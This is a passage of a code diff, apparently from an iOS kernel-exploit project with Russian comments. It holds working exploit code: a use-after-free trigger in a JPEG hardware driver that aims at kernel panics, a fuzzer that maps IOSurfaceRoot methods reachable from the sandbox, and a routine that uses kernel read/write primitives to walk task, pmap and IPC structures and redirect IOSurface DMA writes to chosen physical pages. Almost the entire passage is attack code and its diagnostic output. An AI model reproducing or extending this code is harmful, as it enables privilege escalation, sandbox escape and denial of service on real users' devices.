+    // TRUNCATED JPEG (без EOI — HW висит до таймаута), close пока висит →
+    // pool_free без dequeue; stale-ноду читает timeout/finish workloop
+    // (finish_io_gated 0x91d0fc0 / timeout 0x91de4a4). Триггер = ASYNC
+    // (token≠0) на persistent-коннекшене.
+    const int CYCLES = 15, V_REQS = 12;
+    int victimTotal = 0;
+    BOOL healthy = YES;
+
+    // Persistent trigger-коннекшен: async-декоды валидного JPEG (token≠0) —
+    // их finish-путь перечитывает список запросов, включая stale-ноды.
+    io_connect_t trig = 0;
+    BOOL trigOK = (IOServiceOpen(svc, mach_task_self(), 0, &trig) == KERN_SUCCESS && trig);
+    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async TRUNCATED → HW висит, close) + ASYNC-триггер на persistent conn=%@ ---",
+               CYCLES, V_REQS, trigOK ? [NSString stringWithFormat:@"0x%x", trig] : @"НЕ ОТКРЫЛСЯ"]);
+    uint64_t trigTok = 0x4142000000CAFE00ULL;
+    for (int c = 0; c < CYCLES; c++) {
+        io_connect_t victim = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+        if (kr == KERN_SUCCESS && victim) {
+            victimTotal += kpJSubmitAsync(victim, srcBadID ? srcBadID : srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
+            usleep(200000); // 1.9.100: 1мс было мало — truncated-декод должен дойти ДО HW (очередь close чистит, HW-пул — нет)
+            IOServiceClose(victim);   // pool_free без dequeue — close HW-пул не трогает
+        }
+        if (trigOK) {
+            trigTok += 0x100;
+            kpJSubmitAsync(trig, srcID, dstID, W, H, 2, trigTok, r);
+        }
+        if ((c + 1) % 10 == 0) {
+            io_connect_t hc = 0;
+            healthy = (IOServiceOpen(svc, mach_task_self(), 0, &hc) == KERN_SUCCESS && hc);
+            if (healthy) {
+                kern_return_t hkr = IOConnectCallMethod(hc, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+                healthy = (hkr == KERN_SUCCESS);
+                IOServiceClose(hc);
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [%d] health=%@ victim=%d — живы", c + 1, healthy ? @"OK" : @"BROKEN", victimTotal]);
+            if (!healthy) break;
+        }
+    }
+
+    // Волна таймаутов: truncated-декоды victim'ов отваливаются по HW-таймауту,
+    // timeout-handler читает pool_free'd ноды. ~12с с async-пинками триггера.
+    kpNote(r, @"  --- жду волну HW-таймаутов (~15с), async-триггер каждые 500мс (timeout-handler читает stale-ноды) ---");
+    for (int i = 0; i < 30; i++) {
+        usleep(500000);
+        if (trigOK) {
+            trigTok += 0x100;
+            kpJSubmitAsync(trig, srcID, dstID, W, H, 1, trigTok, r);
+        }
+        if (i == 15) kpNote(r, @"  …7.5с выжидания, живы (паника возможна в любой момент волны)");
+    }
+    if (trigOK) IOServiceClose(trig);
+    tokenHunt(0x4141000000DEAD00ULL, @"victim-токен (висит ли в freed слоте)");
+
+    io_connect_t fc = 0;
+    BOOL finalOK = (IOServiceOpen(svc, mach_task_self(), 0, &fc) == KERN_SUCCESS && fc);
+    if (finalOK) { IOServiceClose(fc); }
+    kpNote(r, [NSString stringWithFormat:@"  финал: драйвер %@ · victim=%d", finalOK ? @"OK" : @"BROKEN (DoS подтверждён)", victimTotal]);
+
+    CFRelease(srcS);
+    if (srcBad) CFRelease(srcBad);
+    CFRelease(dstS);
+    IOObjectRelease(svc);
+    [r appendString:@"\n=== JPEG UAF: дожили до конца без паники — повторить; паника вероятнее всего в волне HW-таймаутов (timeout-handler читает pool_free'd ноды) ===\n"];
+    return r;
+}
+
+#pragma mark - IOSurfaceRoot external method surface probe
+
+// Empirical map of IOSurfaceRootUserClient: open IOSurfaceRoot (every app can
+// create IOSurfaces, so the root client is reachable from any sandbox) and
+// call selectors 0-63 with a few feed sizes. Unsupported vs BadArgument vs
+// Success reveals which methods exist — the hit list for reverse work.
++ (NSString *)iosurfaceProbeReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== IOSurfaceRootUserClient: карта селекторов (sel 0-63 × 3 корма) ===");
+
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) {
+        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: не найден (errno=%d)", errno]);
+        [r appendString:@"\n=== IOSURF SKIP: сервис недоступен ===\n"];
+        return r;
+    }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) {
+        kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen: kr=0x%x (%s)", kr, mach_error_string(kr)]);
+        IOObjectRelease(svc);
+        [r appendString:@"\n=== IOSURF SKIP: open не прошёл ===\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot открыт: svc=0x%x conn=0x%x", svc, conn]);
+
+    static const struct { const char *name; size_t sz; } feeds[3] = {
+        { "пусто", 0 }, { "0x58", 0x58 }, { "0x1000", 0x1000 },
+    };
+    uint8_t inBuf[0x1000];
+    memset(inBuf, 0, sizeof(inBuf));
+    for (int sel = 0; sel < 64; sel++) {
+        NSMutableString *line = [NSMutableString stringWithFormat:@"  sel %2d:", sel];
+        for (int f = 0; f < 3; f++) {
+            uint64_t outS[16] = {0}; uint32_t outC = 16;
+            uint8_t outBuf[0x1000];
+            size_t outSz = sizeof(outBuf);
+            kern_return_t ckr;
+            if (feeds[f].sz == 0) {
+                ckr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0, outS, &outC, NULL, NULL);
+            } else {
+                ckr = IOConnectCallMethod(conn, sel, NULL, 0, inBuf, feeds[f].sz, outS, &outC, outBuf, &outSz);
+            }
+            const char *tag = "?";
+            switch (ckr) {
+                case 0: tag = "OK"; break;
+                case 0xe00002c7: tag = "unsup"; break;
+                case 0xe00002c2: tag = "arg"; break;
+                case 0xe00002bc: tag = "err"; break;
+                case 0xe00002be: tag = "perm"; break;
+                case 0xe00002c5: tag = "busy"; break;
+                case 0xe00002ca: tag = "nomem"; break;
+                case 0xe00002cd: tag = "inval"; break;
+                case 0xe0000001: tag = "karg"; break;
+            }
+            [line appendFormat:@" %s=%s", feeds[f].name, tag];
+            if (ckr == 0 && outS[0]) [line appendFormat:@"(out0=%#llx)", (unsigned long long)outS[0]];
+        }
+        kpNote(r, line);
+    }
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    [r appendString:@"\n=== Живые методы: не-unsup. Дальше реверс тех, что принимают structIn (arg) — там валидация ===\n"];
+    return r;
+}
+
+#pragma mark - IOSurface backing-PA swap (physwrite via DMA)
+
+// The IOSurface kernel object lives in writable heap (type 0x21 — physmap
+// write user proven). Its backing page list sits at +0x360 (ranges ptr) and
+// +0x3a4 (rangeCount) per the interface doc. Overwrite ranges[0].pa with a
+// target page and submit the scaler on that surface — the DMA engine writes
+// wherever we point. Control page first (pixels must land there), then a
+// protected page to test whether DART validation rejects it.
++ (NSString *)iosurfacePaSwapReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== IOSurface backing-PA swap: physwrite через DMA ===");
+    // 1.9.206 (р.51): DCPAV-проба — 5 прокси display-пайплайна = IODARTMapper-
+    // подклассы. Если io_service_open пройдёт из песочницы — второй DART-фронт
+    // с VA-based дескрипторами (patch-point [desc+0xb8] из р.52 вооружён).
+    {
+        const char *dcpav[5] = { "DCPAVControllerProxy", "DCPAVDeviceProxy", "DCPAVServiceProxy",
+                                 "DCPAVVideoInterfaceProxy", "DCPAVAudioInterfaceProxy" };
+        for (int i = 0; i < 5; i++) {
+            io_service_t s = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(dcpav[i]));
+            if (!s) { kpNote(r, [NSString stringWithFormat:@"  [DCPAV] %s: сервис НЕ найден", dcpav[i]]); continue; }
+            io_connect_t c = IO_OBJECT_NULL;
+            kern_return_t kr = IOServiceOpen(s, mach_task_self(), 0, &c);
+            kpNote(r, [NSString stringWithFormat:@"  [DCPAV] %s: open kr=0x%x%@", dcpav[i], kr,
+                      (kr == KERN_SUCCESS && c) ? @" ← ОТКРЫЛСЯ ИЗ ПЕСОЧНИЦЫ!" : @""]);
+            if (kr == KERN_SUCCESS && c) IOObjectRelease(c);
+            IOObjectRelease(s);
+        }
+    }
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        return r;
+    }
+
+    // 1. victim surface (dst for the scaler) + control page (our target)
+    // 1.9.238: dst 1024×128 BGRA = 512KB = 32 страницы — page-list root-MD из 32
+    // последовательных pfn32: сигнатура, которую DEP найдёт детерминированно
+    // (выигрыш 1.9.207 = голый pfn32, но одиночный он теряется в типах фреймов).
+    NSDictionary *sp32 = @{(__bridge id)kIOSurfaceWidth: @32, (__bridge id)kIOSurfaceHeight: @32,
+                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    NSDictionary *spBig = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @128,
+                            (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)spBig);
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)spBig);   // 1.9.241: обе 1024×128 — identity требует совпадающих dims (submit kr=0xe00002c2 при mismatch 32×32/1024×128)
+    if (!dstS || !srcS) { [r appendString:@"FAIL: surfaces\n"]; return r; }
+    uint32_t dstID = IOSurfaceGetID(dstS);
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    kpNote(r, [NSString stringWithFormat:@"  surfaces: srcID=%u dstID=%u (подменяем backing у dst)", srcID, dstID]);
+
+    // 1.9.116: src заполняем паттерном 0x41 — нулевой src даёт нулевой выход
+    // при ЛЮБОМ рабочем DMA, и «DMA не идёт» был ложным выводом из нулей.
+    IOSurfaceLock(srcS, 0, NULL);
+    uint8_t *spix = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+    if (spix) memset(spix, 0x41, 0x1000);
+    IOSurfaceUnlock(srcS, 0, NULL);
+
+    // 1.9.124: конфиг уже откалиброван на железе дважды (1.9.116, nz=1024):
+    // rect {w=32,h=32} @ +0x0C/+0x10. Калибровочный свип убран — каждый
+    // M2-оп отравляет scheduler (zone-паники 172948/173443), чем меньше,
+    // тем дольше живём.
+    uint8_t tsdGood[0x1B0];
+    memset(tsdGood, 0, sizeof(tsdGood));
+    BOOL tsdOK = YES;
+    *(uint32_t *)(tsdGood + 0x0C) = 32;
+    *(uint32_t *)(tsdGood + 0x10) = 32;
+
+    // control page: marker-filled, we own it; get its PA through our own pmap
+    uint8_t *ctl = valloc(0x4000);
+    memset(ctl, 0xCC, 0x4000);
+    uint64_t selfProcM = [self findProcByCommName:getprogname() log:r];
+    if (!selfProcM) selfProcM = [self findProcByCommName:"KexProofV2" log:r];
+    uint64_t prM = 0, tkM = 0, mpM = 0, pmM = 0, ttM = 0;
+    uint64_t ctlPA = 0;
+    if (selfProcM &&
+        kpRead(selfProcM + koffsetof(proc, proc_ro), &prM, 8, "ps proc_ro", r) &&
+        kpRead(kp_untag_ptr(prM) + off_proc_ro_pr_task, &tkM, 8, "ps task", r)) {
+        tkM = kp_untag_ptr(tkM);
+        kpRead(tkM + off_task_map, &mpM, 8, "ps map", r);
+        mpM = kp_untag_ptr(mpM);
+        kpRead(mpM + koffsetof(vm_map, pmap), &pmM, 8, "ps pmap", r);
+        pmM = kp_untag_ptr(pmM);
+        kpRead(pmM + koffsetof(pmap, ttep), &ttM, 8, "ps ttep", r);
+        ttM = kp_untag_ptr(ttM);
+        if (ttM) ctlPA = vtophys(ttM, (uint64_t)ctl);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  контрольная страница: VA=%#llx PA=%#llx (заполнена 0xCC)",
+              (unsigned long long)(uint64_t)ctl, (unsigned long long)ctlPA]);
+    if (!ctlPA) { [r appendString:@"FAIL: контрольный PA не получен\n"]; free(ctl); return r; }
+
+    // 1.9.142: ctlPA валидация маркером (как backingPA) — если vtophys для
+    // valloc-страницы врёт, подмена писала в мусорный PA и «не сработало»
+    // означает «сработало не туда», а не «redirect мёртв».
+    *(volatile uint32_t *)ctl = 0xCAFEBABE;
+    uint64_t ctlKVA = gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0;
+    uint32_t cprobe = 0;
+    BOOL ctlOk = ctlKVA && kpRead(ctlKVA, &cprobe, 4, "ctlPA proof", r) && cprobe == 0xCAFEBABE;
+    *(volatile uint32_t *)ctl = 0xCCCCCCCC;   // вернуть заполнение для чека
+    kpNote(r, [NSString stringWithFormat:@"  ctlPA валидация: phystokv(%#llx)=%#x → %@", (unsigned long long)ctlPA, cprobe,
+              ctlOk ? @"ВЕРНО" : @"МИМО — подмена шла бы в чужой PA!"]);
+    if (!ctlOk) { free(ctl); return r; }
+
+    // 2. АВТОРИТЕТНЫЙ backing PA (1.9.108): конец object-археологии (тройка
+    //    матчилась на scaler-конфиги, vtable PAC-солена — три промаха). Пиксели
+    //    dst-поверхности маппятся в наш процесс → backing PA = vtophys по нашей
+    //    pmap (как ctlPA выше). Санити: маркер в пиксели → phystokv(backingPA).
+    IOSurfaceLock(dstS, 0, NULL);
+    uint8_t *pix = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
+    if (pix) *(volatile uint32_t *)pix = 0x41544159;
+    IOSurfaceUnlock(dstS, 0, NULL);
+    if (!pix || !ttM) { [r appendString:@"FAIL: нет пиксельного VA/ttM\n"]; free(ctl); return r; }
+    uint64_t backingPA = vtophys(ttM, (uint64_t)pix);
+    uint64_t backKVA = (backingPA && gPrimitives.phystokv) ? gPrimitives.phystokv(backingPA) : 0;
+    uint32_t probe = 0;
+    BOOL proven = backKVA && kpRead(backKVA, &probe, 4, "backing vtophys proof", r) && probe == 0x41544159;
+    kpNote(r, [NSString stringWithFormat:@"  backing PA dst = %#llx (vtophys пикселей VA=%#llx), маркер по phystokv: %#x → %@",
+              (unsigned long long)backingPA, (unsigned long long)(uint64_t)pix, probe,
+              proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
+    if (!backingPA || !proven) { free(ctl); return r; }
+
+    // 1.9.141 SCAN A: физика поверхности в kernel-структурах СРАЗУ после
+    //    create, ДО churn/submit/execute. Сравнение со SCAN B (после execute)
+    //    отвечает: create-wired (redirect после create невозможен) или
+    //    execute-wired (подмена просто не в то поле).
+    uint64_t saAddr[24] = {0}, saQ[24] = {0};   // 1.9.244: SCAN A хиты — ранний патч до DEP-скана
+    int nSA = 0;
+    kpNote(r, @"  SCAN A (после create, до churn/submit):");
+    {
+        uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        uint64_t pfn64m = backingPA >> 14;
+        int nHits = 0;
+        for (uint64_t pg = 0; pg < totalPages && nHits < 24; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            kreadbuf(kva, buf, sizeof(buf));   // 1.9.189: рет НЕ проверяем — ds-шим всегда 0, старый `if(!kreadbuf) continue` пропускал анализ ВСЕГДА
+            for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                int form = 0;
+                if (q == backingPA) form = 1;
+                else if ((uint32_t)q == (uint32_t)pfn64m && !(q >> 32)) form = 2;
+                else if ((uint32_t)(q >> 32) == (uint32_t)pfn64m) form = 3;
+                else if ((uint32_t)q == (uint32_t)pfn64m) form = 4;
+                if (!form) continue;
+                nHits++;
+                if (nSA < 24) { saAddr[nSA] = kva + o; saQ[nSA] = q; nSA++; }
+                kpNote(r, [NSString stringWithFormat:@"    [A] hit#%d форма%d @ %#llx: %#018llx", nHits, form,
+                          (unsigned long long)(kva + o), (unsigned long long)q]);
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [A] попаданий=%d (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)", nHits]);
+    }
+
+    // 3. БЫСТРЫЙ резолв page-list через surface table нашего UC (раунд 17):
+    //    [UC+0xe8] collection → +0xd0 array (индекс = surfaceID) → surfVA →
+    //    +0x178 rangeObj → +0x18 = ranges[0] {pfn32(hi32), pagecount(lo32)}.
+    //    6 kread вместо ~30с скана — подмена успевает до первого execute/wire.
+    //    UC фреймворка находим перебором наших портов (is_table цепочка) —
+    //    само-верифицируется: ranges.hi32<<14 должен совпасть с backingPA.
+    uint32_t pfn32 = (uint32_t)(backingPA >> 14);
+    uint32_t ctlPFN = (uint32_t)(ctlPA >> 14);
+    uint64_t isTable = 0;
+    uint64_t taskVA = 0;
+    {
+        // 1.9.135: isTable-цепочка на early_kread64 — единственном примитиве,
+        // который читает ВЕЗДЕ (E9 разрешает proc-цепочку каждый boot;
+        // kpRead/kreadbuf флаки по регионам: isTable=0 на 1.9.133/134).
+        // Per-link лог — видно, на каком звене замирает, если замирает.
+        uint64_t pr2 = 0, tk2 = 0, spc2 = 0, tb2 = 0;
+        if (selfProcM) {
+            pr2 = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+            tk2 = pr2 ? early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task) : 0;
+            spc2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_itk_space) : 0;
+            tb2 = spc2 ? early_kread64(kp_untag_ptr(spc2) + off_ipc_space_is_table) : 0;
+            if (tb2) {
+                isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                          ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
+            }
+            taskVA = tk2;   // 1.9.137: наш task VA — для реестра клиентов по task
+        }
+        kpNote(r, [NSString stringWithFormat:@"  isTable=%#llx (звенья: proc_ro=%#llx task=%#llx itk=%#llx)",
+                  (unsigned long long)isTable, (unsigned long long)pr2,
+                  (unsigned long long)tk2, (unsigned long long)spc2]);
+    }
+    // === 1.9.143: ПРЯМОЙ порт-маршрут к IOSurface, БЕЗ реестра IOSurfaceRoot ===
+    // isTable-цепочка уже работает (этот бут: svc 0x8423 → живой kobject). Вместо
+    // обхода реестра клиентов делаем mach-порт на dstS и резолвим ЕГО kobject:
+    //   isTable[port>>8].ie_object → ipc_port → ip_kobject = IOSurfaceSendRight →
+    //   скан полей: указатель на объект с [X+0x10]==dstID — это сам IOSurface.
+    // Затем собираем ВСЕ копии page-list'а (в самом объекте за 0x400, в
+    // rangeObj(+0x178), в XPF ranges(+0x360 если ptr, gate по rangeCount +0x3a4))
+    // и патчим pfn→ctl ДО любого submit: execute скейлера снимает DVA-снапшот
+    // с уже пропатченного списка — никакой гонки с churn-окном.
+    uint64_t surfVA = 0, rangesVA = 0, rootVA = 0;
+    uint64_t srcVA = 0, srcBuf = 0;   // 1.9.252: src-поверхность + её record buffer — physread через DART в нормальном направлении
+    uint64_t slotVAs[8] = {0}, origQs[8] = {0}, newQs[8] = {0};
+    int slotForm[8] = {0};
+    int nSlots = 0;
+    // 1.9.145: верификация поверхности по PFN-ЦЕПОЧКЕ (железная правда backingPA),
+    // а не по полю ID — оффсет/ширина surfaceID на 18.6 под вопросом (раунд 28):
+    // все маршруты с проверкой (uint32_t)[X+0x10]==dstID промахивались одинаково.
+    // fast: [X+0x178]=rangeObj → [ro+0x18] = {pfn32 hi, pagecount lo 1..8} (3 чтения,
+    // для циклов). full: fast + inline qword с hi32==pfn32, lo32 1..8 в первых 0x400.
+    BOOL (^surfFast)(uint64_t) = ^BOOL(uint64_t c) {
+        if (!kpLooksLikeKernelPointer(c)) return NO;
+        // 1.9.152: page-edge guard — маленький объект у края 16K-страницы: чтение
+        // c+0x178/c+0x400 вылезает в соседнюю (возможно немапнутую) → data abort
+        // (вероятная причина ребута #2 на дампе fobj).
+        if ((uint32_t)(c & 0x3fff) + 0x180 > 0x4000) return NO;
+        uint64_t ro = kp_untag_ptr(early_kread64(c + 0x178));
+        if (!kpLooksLikeKernelPointer(ro)) return NO;
+        uint64_t q = early_kread64(ro + 0x18);
+        if ((uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8) return YES;
+        // 1.9.153: [rangeObj+0x18] может быть УКАЗАТЕЛЕМ на массив pfn, а не самим
+        // массивом — прогон 1.9.152: поверхность найдена, слотов нет.
+        uint64_t arrP = kp_untag_ptr(q);
+        if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) {
+            uint64_t q2 = early_kread64(arrP);
+            if ((uint32_t)(q2 >> 32) == pfn32 && (uint32_t)q2 >= 1 && (uint32_t)q2 <= 8) return YES;
+        }
+        return NO;
+    };
+    BOOL (^surfFull)(uint64_t) = ^BOOL(uint64_t c) {
+        if (surfFast(c)) return YES;
+        if (!kpLooksLikeKernelPointer(c)) return NO;
+        uint32_t lim = 0x400;
+        uint32_t room = 0x4000 - (uint32_t)(c & 0x3fff);
+        if (room < lim) lim = room;
+        for (uint32_t o = 0; o + 8 <= lim; o += 8) {
+            uint64_t q = early_kread64(c + o);
+            if ((uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8) return YES;
+        }
+        return NO;
+    };
+    if (isTable && dstS) {
+        // 1.9.144: vtable-карта ВСЕХ портов задачи + brute-force обоих
+        // экстракторов (SendRight→поле→surf; RootUC→[+0xe8]→coll→arr[dstID])
+        // с верификацией [X+0x10]==dstID (раунд 26: SendRight vt file 0x7eef568,
+        // поле +0x18; RootUC 0x7eed8f0; Root 0x7eed2f8; surfaceID @ +0x10).
+        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t vtSendRight = 0xfffffff007eef4c8ULL + kslide;   // р.31: instance vtable IOSurfaceSendRight (0x7eef568 = metaclass dispatch, не то!)
+        uint64_t vtRootUC    = 0xfffffff007eed8f0ULL + kslide;
+        uint64_t vtRoot      = 0xfffffff007eed2f8ULL + kslide;
+        // 1.9.146: ip_kobject ОРАКУЛ — оффсет не из статики, а с железа: резолвим
+        // наш task port (selfTask VA валидирован) и сканируем его заголовок за
+        // selfTask. Заодно валидирует весь walk: если selfTask не нашёлся —
+        // сломан слой выше (is_table/SMR/ie_object), а не ip_kobject.
+        static uint32_t kobjOffRt = 0;
+        if (!kobjOffRt) {
+            uint64_t taskVU = kp_untag_ptr(taskVA);
+            uint32_t tp = mach_task_self();
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (tp >> 8);
+            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+            uint64_t pVA = kp_untag_ptr(oRaw);
+            if (kpLooksLikeKernelPointer(pVA)) {
+                for (uint32_t off = 0x8; off + 8 <= 0x90; off += 8) {
+                    if (kp_untag_ptr(early_kread64(pVA + off)) == taskVU) { kobjOffRt = off; break; }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  ip_kobject oracle: task port VA=%#llx selfTask=%#llx → ip_kobject @ +0x%x (статика +0x%x)%@",
+                          (unsigned long long)pVA, (unsigned long long)taskVU,
+                          kobjOffRt, off_ipc_port_ip_kobject,
+                          kobjOffRt ? @"" : @" — НЕ НАЙДЕН, walk сломан выше!"]);
+            } else {
+                kpNote(r, [NSString stringWithFormat:@"  ip_kobject oracle: task port не разрешился (eVA=%#llx oRaw=%#llx) — walk сломан на ie_object/is_table",
+                          (unsigned long long)eVA, (unsigned long long)oRaw]);
+            }
+            if (!kobjOffRt) kobjOffRt = off_ipc_port_ip_kobject;   // fallback на статику
+        }
+        uint64_t (^resolveKobj)(uint32_t) = ^uint64_t(uint32_t nm) {
+            if (!nm) return (uint64_t)0;
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (nm >> 8);
+            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+            uint64_t pVA = kp_untag_ptr(oRaw);
+            if (!kpLooksLikeKernelPointer(pVA)) return (uint64_t)0;
+            uint64_t kRaw = early_kread64(pVA + kobjOffRt);
+            uint64_t kobj = kp_untag_ptr(kRaw);
+            return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
+        };
+        uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
+            // 1.9.152: fObject = IOSurfaceSendRight (р.31) — СНАЧАЛА verify vtable
+            // (0x7eef4c8), потом +0x18 = IOSurface* (verify surfFast/[surf+0x10]).
+            // Глубокие сканы только после vtable — crash-guard (ребут #2).
+            if (surfFull(kobj)) return kobj;
+            uint64_t fobj = kp_untag_ptr(early_kread64(kobj + 0x30));
+            if (kpLooksLikeKernelPointer(fobj)) {
+                if (kp_untag_ptr(early_kread64(fobj)) == vtSendRight) {
+                    uint64_t surf = kp_untag_ptr(early_kread64(fobj + 0x18));
+                    if (surfFast(surf)) return surf;
+                    if (kpLooksLikeKernelPointer(surf) && (uint32_t)early_kread64(surf + 0x10) == dstID) return surf;
+                }
+                if (surfFast(fobj)) return fobj;
+                for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
+                    uint64_t c = kp_untag_ptr(early_kread64(fobj + o));
+                    if (surfFast(c)) return c;
+                }
+            }
+            for (uint32_t o = 0; o < 0x100; o += 8) {
+                uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
+                if (surfFast(c)) return c;
+            }
+            return (uint64_t)0;
+        };
+        uint64_t (^surfFromUC)(uint64_t) = ^uint64_t(uint64_t uc) {
+            for (uint32_t hop = 0; hop < 2; hop++) {
+                uint64_t base = hop ? kp_untag_ptr(early_kread64(uc + 0x30)) : uc;
+                if (!kpLooksLikeKernelPointer(base)) continue;
+                uint64_t coll = kp_untag_ptr(early_kread64(base + 0xe8));
+                if (!kpLooksLikeKernelPointer(coll)) continue;
+                uint64_t cnt2 = early_kread64(coll + 0xd8);
+                uint64_t arr2 = kp_untag_ptr(early_kread64(coll + 0xd0));
+                if (!kpLooksLikeKernelPointer(arr2) || cnt2 <= dstID || cnt2 >= 0x200000) continue;
+                uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
+                if (!surfFull(cand)) continue;
+                return cand;
+            }
+            return (uint64_t)0;
+        };
+        // smp: сырцовый дамп kobj — понять, почему 1.9.143 не нашла SendRight-поле
+        typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
+        static CreateMachPort_t pCreateMachPort = NULL;
+        if (!pCreateMachPort)
+            pCreateMachPort = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        mach_port_t smp = pCreateMachPort ? pCreateMachPort(dstS) : 0;
+        uint64_t smpKobj = resolveKobj(smp);
+        uint64_t smpVt = smpKobj ? kp_untag_ptr(early_kread64(smpKobj)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: smp=0x%x kobj=%#llx vt=%#llx (file %#llx; SendRight ждём %#llx)",
+                  smp, (unsigned long long)smpKobj, (unsigned long long)smpVt,
+                  (unsigned long long)(smpVt ? smpVt - kslide : 0), (unsigned long long)vtSendRight]);
+        if (smpKobj) {
+            for (uint32_t o = 0; o + 8 <= 0x38; o += 8) {
+                uint64_t q = early_kread64(smpKobj + o);
+                uint64_t u = kp_untag_ptr(q);
+                kpNote(r, [NSString stringWithFormat:@"    kobj+0x%02x: raw=%#018llx untag=%#018llx%@",
+                          o, (unsigned long long)q, (unsigned long long)u,
+                          kpLooksLikeKernelPointer(u)
+                            ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
+            }
+            // раунд 30: IOMachPort: +0x28 = fPort (ipc_port), +0x30 = fObject.
+            // kotype = [fPort]&0x3ff (0x1b export/0x1d connect/0x1e service).
+            uint64_t fport = kp_untag_ptr(early_kread64(smpKobj + 0x28));
+            uint32_t kotype = kpLooksLikeKernelPointer(fport) ? ((uint32_t)early_kread64(fport) & 0x3ff) : 0;
+            uint64_t fobj = kp_untag_ptr(early_kread64(smpKobj + 0x30));
+            uint64_t fobjVt = kpLooksLikeKernelPointer(fobj) ? kp_untag_ptr(early_kread64(fobj)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"    IOMachPort: fPort=%#llx kotype=0x%x fObject=%#llx vt=%#llx (file %#llx%@)",
+                      (unsigned long long)fport, kotype, (unsigned long long)fobj,
+                      (unsigned long long)fobjVt,
+                      (unsigned long long)(fobjVt ? fobjVt - kslide : 0),
+                      fobjVt == vtSendRight ? @" = SendRight!" : @""]);
+            if (kpLooksLikeKernelPointer(fobj) && fobjVt == vtSendRight) {
+                // vtable сошёлся (р.31) — настоящий SendRight: +0x10=Root*, +0x18=IOSurface*
+                uint64_t ownerRt = kp_untag_ptr(early_kread64(fobj + 0x10));
+                uint64_t surf = kp_untag_ptr(early_kread64(fobj + 0x18));
+                kpNote(r, [NSString stringWithFormat:@"    SendRight ✓: owner(Root)=%#llx IOSurface=%#llx ([surf+0x10]=%#x ждём %u) surfFast=%d",
+                          (unsigned long long)ownerRt, (unsigned long long)surf,
+                          kpLooksLikeKernelPointer(surf) ? (uint32_t)early_kread64(surf + 0x10) : 0,
+                          dstID, (int)surfFast(surf)]);
